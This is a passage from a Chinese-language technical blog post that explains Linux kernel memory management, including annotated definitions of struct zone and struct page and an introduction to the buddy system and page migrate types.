    * wait_table_bits      -- wait_table_size == (1 &lt;&lt; wait_table_bits)</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The purpose of all these is to keep track of the people</span></span><br><span class="line"><span class="comment">     * waiting for a page to become available and make them</span></span><br><span class="line"><span class="comment">     * runnable again when possible. The trouble is that this</span></span><br><span class="line"><span class="comment">     * consumes a lot of space, especially when so few things</span></span><br><span class="line"><span class="comment">     * wait on pages at a given time. So instead of using</span></span><br><span class="line"><span class="comment">     * per-page waitqueues, we use a waitqueue hash table.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The bucket discipline is to sleep on the same queue when</span></span><br><span class="line"><span class="comment">     * colliding and wake all in that wait queue when removing.</span></span><br><span class="line"><span class="comment">     * When something wakes, it must check to be sure its page is</span></span><br><span class="line"><span class="comment">     * truly available, a la thundering herd. The cost of a</span></span><br><span class="line"><span class="comment">     * collision is great, but given the expected load of the</span></span><br><span class="line"><span class="comment">     * table, they should be so rare as to be outweighed by the</span></span><br><span class="line"><span class="comment">     * benefits from the saved space.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * __wait_on_page_locked() and unlock_page() in mm/filemap.c, are the</span></span><br><span class="line"><span class="comment">     * primary users of these fields, and in mm/page_alloc.c</span></span><br><span class="line"><span class="comment">     * free_area_init_core() performs the initialization of them.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">/*  进程等待队列的散列表, 这些进程正在等待管理区中的某页  */</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span>       *wait_table;</span><br><span class="line">    <span class="comment">/*  等待队列散列表中的调度实体数目  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       wait_table_hash_nr_entries;</span><br><span class="line">    <span class="comment">/*  等待队列散列表数组大小, 值为2^order  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       wait_table_bits;</span><br><span class="line"></span><br><span class="line">    ZONE_PADDING(_pad1_)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* free areas of different sizes</span></span><br><span class="line"><span class="comment">       页面使用状态的信息，以每个bit标识对应的page是否可以分配</span></span><br><span class="line"><span class="comment">       是用于伙伴系统的，每个数组元素指向对应阶也表的数组开头</span></span><br><span class="line"><span class="comment">       以下是供页帧回收扫描器(page reclaim scanner)访问的字段</span></span><br><span class="line"><span class="comment">       scanner会跟据页帧的活动情况对内存域中使用的页进行编目</span></span><br><span class="line"><span class="comment">       如果页帧被频繁访问，则是活动的，相反则是不活动的，</span></span><br><span class="line"><span class="comment">       在需要换出页帧时，这样的信息是很重要的：   */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">free_area</span>    <span class="title">free_area</span>[<span class="title">MAX_ORDER</span>];</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* zone flags, see below 描述当前内存的状态, 参见下面的enum zone_flags结构 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Write-intensive fields used from the page allocator, 保存该描述符的自旋锁  */</span></span><br><span class="line">    <span class="type">spinlock_t</span>          lock;</span><br><span class="line"></span><br><span class="line">    ZONE_PADDING(_pad2_)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Write-intensive fields used by page reclaim */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Fields commonly accessed by the page reclaim scanner */</span></span><br><span class="line">    <span class="type">spinlock_t</span>          lru_lock;   <span class="comment">/* LRU(最近最少使用算法)活动以及非活动链表使用的自旋锁  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lruvec</span>       <span class="title">lruvec</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * When free pages are below this point, additional steps are taken</span></span><br><span class="line"><span class="comment">     * when reading the number of free pages to avoid per-cpu counter</span></span><br><span class="line"><span class="comment">     * drift allowing watermarks to be breached</span></span><br><span class="line"><span class="comment">     * 在空闲页的数目少于这个点percpu_drift_mark的时候</span></span><br><span class="line"><span class="comment">     * 当读取和空闲页数一样的内存页时，系统会采取额外的工作，</span></span><br><span class="line"><span class="comment">     * 防止单CPU页数漂移，从而导致水印被破坏。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> percpu_drift_mark;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined CONFIG_COMPACTION || defined CONFIG_CMA</span></span><br><span class="line">    <span class="comment">/* pfn where compaction free scanner should start */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       compact_cached_free_pfn;</span><br><span class="line">    <span class="comment">/* pfn where async and sync compaction migration scanner should start */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       compact_cached_migrate_pfn[<span class="number">2</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPACTION</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * On compaction failure, 1&lt;&lt;compact_defer_shift compactions</span></span><br><span class="line"><span class="comment">     * are skipped before trying again. The number attempted since</span></span><br><span class="line"><span class="comment">     * last failure is tracked with compact_considered.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        compact_considered;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        compact_defer_shift;</span><br><span class="line">    <span class="type">int</span>                       compact_order_failed;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined CONFIG_COMPACTION || defined CONFIG_CMA</span></span><br><span class="line">    <span class="comment">/* Set to true when the PG_migrate_skip bits should be cleared */</span></span><br><span class="line">    <span class="type">bool</span>            compact_blockskip_flush;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span>            contiguous;</span><br><span class="line"></span><br><span class="line">    ZONE_PADDING(_pad3_)</span><br><span class="line">    <span class="comment">/* Zone statistics 内存域的统计信息, 参见后面的enum zone_stat_item结构 */</span></span><br><span class="line">    <span class="type">atomic_long_t</span>       vm_stat[NR_VM_ZONE_STAT_ITEMS];</span><br><span class="line">&#125; ____cacheline_internodealigned_in_smp;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>剩下的内容太复杂了，不再赘述。总结参看下方链接即可。总的来讲，“区”只是一种逻辑上的分组，方便操作系统按一定的结构和顺序去管理页的分配。并不是一种物理上的强制措施。</p><blockquote><p>参考<a href="https://www.cnblogs.com/linhaostudy/p/10006723.html#autoid-6-4-0">https://www.cnblogs.com/linhaostudy/p/10006723.html#autoid-6-4-0</a></p></blockquote><h2 id="什么是页框？">什么是页框？</h2><blockquote><p><a href="https://blog.csdn.net/gatieme/article/details/52384636">https://blog.csdn.net/gatieme/article/details/52384636</a><br>这应该是一个大佬一系列的文章</p></blockquote><p>终于到了我们熟悉的内容，区下面管理的就是一个个页框了。linux也用一个结构体管理物理page frame叫做<code>struct page</code>。考虑到大量的page数量，page结构要尽量的小，因此这个结构里使用了大量的联合体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Each physical page in the system has a struct page associated with</span></span><br><span class="line"><span class="comment"> * it to keep track of whatever it is we are using the page for at the</span></span><br><span class="line"><span class="comment"> * moment. Note that we have no way to track which tasks are using</span></span><br><span class="line"><span class="comment"> * a page, though if it is a pagecache page, rmap structures can tell us</span></span><br><span class="line"><span class="comment"> * who is mapping it.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The objects in struct page are organized in double word blocks in</span></span><br><span class="line"><span class="comment"> * order to allows us to use atomic double word operations on portions</span></span><br><span class="line"><span class="comment"> * of struct page. That is currently only used by slub but the arrangement</span></span><br><span class="line"><span class="comment"> * allows the use of atomic double word operations on the flags/mapping</span></span><br><span class="line"><span class="comment"> * and lru list pointers also.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> &#123;</span></span><br><span class="line">    <span class="comment">/* First double word block */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;        <span class="comment">/* Atomic flags, some possibly updated asynchronously</span></span><br><span class="line"><span class="comment">                                              描述page的状态和其他信息  */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span>;</span>  <span class="comment">/* If low bit clear, points to</span></span><br><span class="line"><span class="comment">                         * inode address_space, or NULL.</span></span><br><span class="line"><span class="comment">                         * If page mapped as anonymous</span></span><br><span class="line"><span class="comment">                         * memory, low bit is set, and</span></span><br><span class="line"><span class="comment">                         * it points to anon_vma object:</span></span><br><span class="line"><span class="comment">                         * see PAGE_MAPPING_ANON below.</span></span><br><span class="line"><span class="comment">                         */</span></span><br><span class="line">        <span class="type">void</span> *s_mem;            <span class="comment">/* slab first object 现移动至struct slab结构体*/</span> </span><br><span class="line">        <span class="type">atomic_t</span> compound_mapcount;     <span class="comment">/* first tail page */</span></span><br><span class="line">        <span class="comment">/* page_deferred_list().next     -- second tail page */</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Second double word */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">            <span class="type">pgoff_t</span> index;      <span class="comment">/* Our offset within mapping.</span></span><br><span class="line"><span class="comment">            在映射的虚拟空间（vma_area）内的偏移；</span></span><br><span class="line"><span class="comment">            一个文件可能只映射一部分，假设映射了1M的空间，</span></span><br><span class="line"><span class="comment">            index指的是在1M空间内的偏移，而不是在整个文件内的偏移。 */</span></span><br><span class="line">            <span class="type">void</span> *freelist;     <span class="comment">/* sl[aou]b first free object */</span></span><br><span class="line">            <span class="comment">/* page_deferred_list().prev    -- second tail page */</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_HAVE_CMPXCHG_DOUBLE) &amp;&amp; \</span></span><br><span class="line"><span class="meta">    defined(CONFIG_HAVE_ALIGNED_STRUCT_PAGE)</span></span><br><span class="line">            <span class="comment">/* Used for cmpxchg_double in slub */</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> counters;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * Keep _refcount separate from slub cmpxchg_double</span></span><br><span class="line"><span class="comment">             * data.  As the rest of the double word is protected by</span></span><br><span class="line"><span class="comment">             * slab_lock but _refcount is not.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="type">unsigned</span> counters;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"></span><br><span class="line">                <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     * Count of ptes mapped in mms, to show</span></span><br><span class="line"><span class="comment">                     * when page is mapped &amp; limit reverse</span></span><br><span class="line"><span class="comment">                     * map searches.</span></span><br><span class="line"><span class="comment">                     * 页映射计数器</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    <span class="type">atomic_t</span> _mapcount;</span><br><span class="line"></span><br><span class="line">                    <span class="class"><span class="keyword">struct</span> &#123;</span> <span class="comment">/* SLUB */</span></span><br><span class="line">                        <span class="type">unsigned</span> inuse:<span class="number">16</span>;</span><br><span class="line">                        <span class="type">unsigned</span> objects:<span class="number">15</span>;</span><br><span class="line">                        <span class="type">unsigned</span> frozen:<span class="number">1</span>;</span><br><span class="line">                    &#125;;</span><br><span class="line">                    <span class="type">int</span> units;      <span class="comment">/* SLOB */</span></span><br><span class="line">                &#125;;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * Usage count, *USE WRAPPER FUNCTION*</span></span><br><span class="line"><span class="comment">                 * when manual accounting. See page_ref.h</span></span><br><span class="line"><span class="comment">                 * 页引用计数器</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="type">atomic_t</span> _refcount;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> active;    <span class="comment">/* SLAB */</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Third double word block</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * WARNING: bit 0 of the first word encode PageTail(). That means</span></span><br><span class="line"><span class="comment">     * the rest users of the storage space MUST NOT use the bit to</span></span><br><span class="line"><span class="comment">     * avoid collision and false-positive PageTail().</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lru</span>;</span>   <span class="comment">/* Pageout list, eg. active_list</span></span><br><span class="line"><span class="comment">                     * protected by zone-&gt;lru_lock !</span></span><br><span class="line"><span class="comment">                     * Can be used as a generic list</span></span><br><span class="line"><span class="comment">                     * by the page owner.</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">dev_pagemap</span> *<span class="title">pgmap</span>;</span> <span class="comment">/* ZONE_DEVICE pages are never on an</span></span><br><span class="line"><span class="comment">                        * lru or handled by a slab</span></span><br><span class="line"><span class="comment">                        * allocator, this points to the</span></span><br><span class="line"><span class="comment">                        * hosting device page map.</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span>        <span class="comment">/* slub per cpu partial pages */</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">next</span>;</span>      <span class="comment">/* Next partial slab */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_64BIT</span></span><br><span class="line">            <span class="type">int</span> pages;      <span class="comment">/* Nr of partial slabs left */</span></span><br><span class="line">            <span class="type">int</span> pobjects;   <span class="comment">/* Approximate # of objects */</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">            <span class="type">short</span> <span class="type">int</span> pages;</span><br><span class="line">            <span class="type">short</span> <span class="type">int</span> pobjects;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span>       <span class="comment">/* Used by SLAB</span></span><br><span class="line"><span class="comment">                         * when destroying via RCU</span></span><br><span class="line"><span class="comment">                         */</span></span><br><span class="line">        <span class="comment">/* Tail pages of compound page */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> compound_head; <span class="comment">/* If bit zero is set */</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* First tail page only */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_64BIT</span></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * On 64 bit system we have enough space in struct page</span></span><br><span class="line"><span class="comment">             * to encode compound_dtor and compound_order with</span></span><br><span class="line"><span class="comment">             * unsigned int. It can help compiler generate better or</span></span><br><span class="line"><span class="comment">             * smaller code on some archtectures.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> compound_dtor;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> compound_order;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> compound_dtor;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> compound_order;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_TRANSPARENT_HUGEPAGE) &amp;&amp; USE_SPLIT_PMD_PTLOCKS</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> __pad;    <span class="comment">/* do not overlay pmd_huge_pte</span></span><br><span class="line"><span class="comment">                         * with compound_head to avoid</span></span><br><span class="line"><span class="comment">                         * possible bit 0 collision.</span></span><br><span class="line"><span class="comment">                         */</span></span><br><span class="line">            <span class="type">pgtable_t</span> pmd_huge_pte; <span class="comment">/* protected by page-&gt;ptl */</span></span><br><span class="line">        &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Remainder is not double word aligned */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> private;      <span class="comment">/* Mapping-private opaque data:</span></span><br><span class="line"><span class="comment">                         * usually used for buffer_heads</span></span><br><span class="line"><span class="comment">                         * if PagePrivate set; used for</span></span><br><span class="line"><span class="comment">                         * swp_entry_t if PageSwapCache;</span></span><br><span class="line"><span class="comment">                         * indicates order in the buddy</span></span><br><span class="line"><span class="comment">                         * system if PG_buddy is set.</span></span><br><span class="line"><span class="comment">                         * 私有数据指针，由应用场景确定其具体的含义</span></span><br><span class="line"><span class="comment">                         */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_SPLIT_PTE_PTLOCKS</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ALLOC_SPLIT_PTLOCKS</span></span><br><span class="line">        <span class="type">spinlock_t</span> *ptl;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        <span class="type">spinlock_t</span> ptl;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span>  <span class="comment">/* SL[AU]B: Pointer to slab */</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span> *<span class="title">mem_cgroup</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * On machines where all RAM is mapped into kernel address space,</span></span><br><span class="line"><span class="comment">     * we can simply calculate the virtual address. On machines with</span></span><br><span class="line"><span class="comment">     * highmem some memory is mapped into kernel virtual memory</span></span><br><span class="line"><span class="comment">     * dynamically, so we need a place to store that address.</span></span><br><span class="line"><span class="comment">     * Note that this field could be 16 bits on x86 ... ;)</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Architectures with slow multiplication can define</span></span><br><span class="line"><span class="comment">     * WANT_PAGE_VIRTUAL in asm/page.h</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(WANT_PAGE_VIRTUAL)</span></span><br><span class="line">    <span class="type">void</span> *virtual;          <span class="comment">/* Kernel virtual address (NULL if</span></span><br><span class="line"><span class="comment">                       not kmapped, ie. highmem) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* WANT_PAGE_VIRTUAL */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KMEMCHECK</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * kmemcheck wants to track the status of each byte in a page; this</span></span><br><span class="line"><span class="comment">     * is a pointer to such a status block. NULL if not tracked.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">void</span> *shadow;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> LAST_CPUPID_NOT_IN_PAGE_FLAGS</span></span><br><span class="line">    <span class="type">int</span> _last_cpupid;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The struct page can be forced to be double word aligned so that atomic ops</span></span><br><span class="line"><span class="comment"> * on double words work. The SLUB allocator can make use of such a feature.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_HAVE_ALIGNED_STRUCT_PAGE</span></span><br><span class="line">    __aligned(<span class="number">2</span> * <span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p>在较低版本的内核中，slab没有单独的结构体，全部都是集成到page中的。后续由于空间和可读性的原因将slab单独抽了出来。page结构内部还是有相当多的slab有关字段，以及标识页面所属和属性的标志位。</p><h1>Buddy System——伙伴系统</h1><blockquote><p>attrnba3大佬的博客 <a href="https://arttnba3.cn/2021/02/21/OS-0X00-LINUX-KERNEL-PART-I/#%E4%B8%89%E3%80%81buddy-system">https://arttnba3.cn/2021/02/21/OS-0X00-LINUX-KERNEL-PART-I/#三、buddy-system</a></p></blockquote><p>Buddy System是linux内核以内存页为粒度的一种底层管理机制。在一个zone中会有一个free_area数组用来存储页面，一般大小为11。这个数组就是给buddy system管理用的。</p><p>buddy system本质上也是为了解决频繁内存分配的问题而生的。因为其实理论上我们有page后就可以进行分配了，但是这会面临相当多的问题，最重要的一个问题之一就是碎片。碎片分为内部碎片和外部碎片，外部碎片指的是页碎片，分配3个，释放第一个，这样再次分配大于1的页面第一页就永远不会被用到。内部碎片则是指页内碎片，比如我只需要很少的字节却分配4k的页面导致大量内存闲置。而buddy system就是为了解决外部碎片而生的。下面所说的slab/slob则是为了解决内部碎片而生的。</p><p>buddy system给出了一种很聪明的管理方案，它将物理内存页按照不同的数量（2的幂次）划分连续的块进行分配并用一个数组进行管理。比如free_area[0]就是单个page连接的链表，而free_area[1]则是每个元素由两个物理连续的page构成的链表，依此类推。</p><p><img src="/images/linux_mem/buddy_system.png" alt="buddy_system.png"></p><p>同时，buddy system将页标识为了不同的属性：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">migratetype</span> &#123;</span></span><br><span class="line">MIGRATE_UNMOVABLE,</span><br><span class="line">MIGRATE_MOVABLE,</span><br><span class="line">MIGRATE_RECLAIMABLE,</span><br><span class="line">MIGRATE_PCPTYPES,<span class="comment">/* the number of types on the pcp lists */</span></span><br><span class="line">MIGRATE_HIGHATOMIC = MIGRATE_PCPTYPES,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CMA</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * MIGRATE_CMA migration type is designed to mimic the way</span></span><br><span class="line"><span class="comment"> * ZONE_MOVABLE works.  Only movable pages can be allocated</span></span><br><span class="line"><span class="comment"> * from MIGRATE_CMA pageblocks and page allocator never</span></span><br><span class="line"><span class="comment"> * implicitly change migration type of MIGRATE_CMA pageblock.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The way to use it is to change migratetype of a range of</span></span><br><span class="line"><span class="comment"> * pageblocks to MIGRATE_CMA which can be done by</span></span><br><span class="line"><span class="comment"> * __free_pageblock_cma() function.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">MIGRATE_CMA,</span><br><span class="line"><span class="meta">#<span 